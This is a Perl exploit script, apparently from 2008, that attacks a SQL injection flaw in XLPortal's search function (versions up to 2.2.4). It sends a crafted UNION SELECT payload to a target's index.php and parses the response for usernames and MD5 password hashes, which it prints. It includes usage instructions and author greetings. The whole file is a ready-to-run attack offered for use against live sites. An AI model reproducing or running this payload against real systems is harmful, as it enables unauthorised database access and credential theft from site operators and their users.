#!D:\Perl\Bin\Perl.exe

use LWP::UserAgent;

#
#   XLPortal <= 2.2.4 (search) Remote SQL Injection Exploit
#   Coded by cOndemned 
#   Greetz : irk4z, GregStar, NoRuless, Tomu, Happy B'day Avantura ;*
#

print "\r\n[~] XLPortal <= 2.2.4 (search) Remote SQL Injection Exploit";
print "\r\n[~] Coded by cOndemned [22.03.2008]\r\n";

if (@ARGV < 2) {
    print "[~] Usage : $0 <target_host> <pref>\r\n";    # default pref is xlp / xlportal
    exit();
}

$head = new LWP::UserAgent;
$head->agent("Opera/9.26 (Windows NT 5.1; U; pl)");

my $request = HTTP::Request->new(POST => $ARGV[0]."/index.php");


$buff = "%27+union+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29+from+".$ARGV[1]."_users+%2F*";
$request->content_type('application/x-www-form-urlencoded');
$request->content("page=Szukaj&op=Wyszukaj&query=".$buff."&section_News=1&section_Download=1&s".
                  "ection_Links=1&section_Articles=1&exact=any&sort=alpha&=Rozpocznij+wyszukiw".
                  "anie");
$response = $head->request($request);

if (($response->content =~ /([a-zA-Z]+?):([0-9,a-f]{32})/)) {        
    print "[+] Login : $1\r\n";
    print "[+] Haslo : $2\r\n";
}
else {
    print "\r\n[~] This one isn't vulnerable, or bad data was given\r\n";
    exit();
}
